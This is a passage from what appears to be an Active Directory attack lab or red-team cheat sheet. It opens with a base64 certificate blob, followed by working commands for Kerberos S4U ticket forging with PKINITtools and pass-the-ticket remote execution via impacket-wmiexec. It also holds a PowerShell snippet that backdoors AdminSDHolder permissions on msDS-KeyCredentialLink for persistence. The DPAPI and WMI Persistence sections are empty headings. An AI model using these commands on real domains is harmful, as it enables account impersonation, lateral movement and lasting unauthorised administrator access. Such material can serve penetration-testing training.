GIObGW+HpBmWrO7Lr/bmYd9hVQ0tGKVJCdHX+jnEVSZCcSKoblhnTcbHZ64z8JBt1YC3BD8lSNn0PVWwd1MY+NHNv9OcuR0YYsI7PIftp69wxeaJVxYGUfXU4UMmU0UVg0uXEq7lAg3+krMzb4rVyWQGMZ3yFL/5qURKC8IDHRVmoSSoc8XopYvhAhSDb+S622xmdY3wT1c4HNRdXhvT2lrMnGFvSWl5Nocx0aVqeMEqeo0WjJwFIGoiUhJmMQ40eHV5suzwqyUDTVrRsFcnUmmRzAyxQymsjl6wukTz+CvdxpKoCltAYUr5mPPK7upHcx5qCZQYmSeOfz5z8HzJfhlHQ8+VEXgm1hNmS3HFhqJbosnqjrZ7+YxQCkBgM8Y1/RSd5Jjdlm8x/8XJ0e38AKmRavIa0ZYwjgoTkNnX3/4zyECUTDOO3wJ/hpL6F5mY8prTV2ImLmkjSmot+XSLiDejSJWg0vFaKkMuzin7qQzgGBcfXOFmkurtoqq1OEYSjZUC+UT7vIxQAh6kIDre+qRkAY9twxFYXI01wvuwtY+pb4gO0CvGeIPEXxXNBPOffoyHQnIAkBMgt2xLZKZcqkn3JEf8uJsbmV0dEMq+k8Cs+z99ChcIoGqoKrM2CJ9+LwVL4oP4DiZsN5Ixwb8YnrYijegOzI1HM6WX0x168QdZFuFgT0JvOjvGh2wTzT0e29O366kR41BpGCwUdmMSvyLxwqxCEnlN5kRrJ2BhHKtM0MEvI5EXnfYo18fNF+DXmYCXBV+ruZnm7ZlLBysUka60ApLLHtwdlR5BXm2ZaA2CADhO030u/erhIyUez7Nd/mreC++lp8hJU8zd0jh1y1X67yk0LiqdT6MAueLkVEY0a+slPFV11l9MwXwpACJipXYt1kqZ4/AMKBb8EPwiJv4gCplS1dAJZUfB/PJl20S03Mu2ijC5ffY3Dfz+QmuffwKI5PlxFnVp4fRxqsne33Xn7PQQD3TkaHlUN0ZduMglmJHy9AdzrkQQr//pT+V2n1KM/6M8atz794XCupIkQ0gf71gd1RQU+JEJ1RsyyDqBG6EAw7WoTATzBp1yOayORA488IDjPAf3R2dNV43lQKO8OXVRPRpmNIGGcmUb9/MOlVLkCU+VPee+jVgPC+mcLzva9e3KBmz0wnpkJNso+QWxQDv4KZzr3d2fBAnIJLgwcdaxRSztLmhW87Vy4QDDqQRDkdLZZCYYFN5I4qcxTuIQ0NDzo9oS5YSPzO3FeST9BkuMj7buUXrx2oR8b3BtHEoZB7Eo23qlalMvCqif01P8I2RFaZdGnGCrbvCQgktw2jbvt51jAz0Goa0iRt/Dy9gXja2tSoqmEeTrGhsyT1A9Poi5ENjaTpRvPHMVNLJvB9fgQ18sOYlBzOyEKJu08UEipw5CU0WsE/vbee3rFz21i4lI0Duh/XEx2TqTh/7ETUuNeNmy7gx28qMi3crsF0buY5VN7TnrWU5VRuMMxxhNw/S2+/ZPAKjsRPQi/SQBaFOP7r58Mg5Mj/AtHnGvGbTWk5in7tDk3iOLrAMkDjnHVSxolEhGOr8EJxkwQqjOTc9Ov8YEaQVu7AR1SWZGSAZeTuezElMCMGCSqGSIb3DQEJFTEWBBRl1l44leDu2pmnkD8o6tlJM0ghWzA9MDEwDQYJYIZIAWUDBAIBBQAEIHYatcNymIhuSiueVyIqekwPQwVye9P85D6Di2a1GgNsBAhlIQM6U8qzJA==
```

#### Kerberos S4U

```bash
python3 PKINITtools/gets4uticket.py -v kerberos+ccache://contoso.com\\contoso-pc2\$:pc2.ccache@contoso-dc.contoso.com HOST/contoso-pc2.contoso.com@CONTOSO.COM Admin@contoso.com admin.ccache
```

#### Pass-the-Ticket

```bash
KRB5CCNAME=admin.ccache impacket-wmiexec -k -no-pass contoso.com/Admin@contoso-pc2.contoso.com 'dir c:'
```

## AdminSDHolder

Computer: CONTOSO-DC

```powershell
# Modify AdminSDHolder permissions
$adminSDHolder = 'CN=AdminSDHolder,CN=System,{0}' -f (Get-ADDomain).DistinguishedName
dsacls.exe $adminSDHolder /G 'Enterprise Key Admins:RPWP;msDS-KeyCredentialLink'

# Force ACL propagation
$pdc = (Get-ADDomain).PDCEmulator
$rootDSE = [adsi] "LDAP://$pdc/RootDSE"
$rootDSE.UsePropertyCache = $false
$rootDSE.Put('runProtectAdminGroupsTask', 1)
$rootDSE.SetInfo()
```

## DPAPI

## WMI Persistence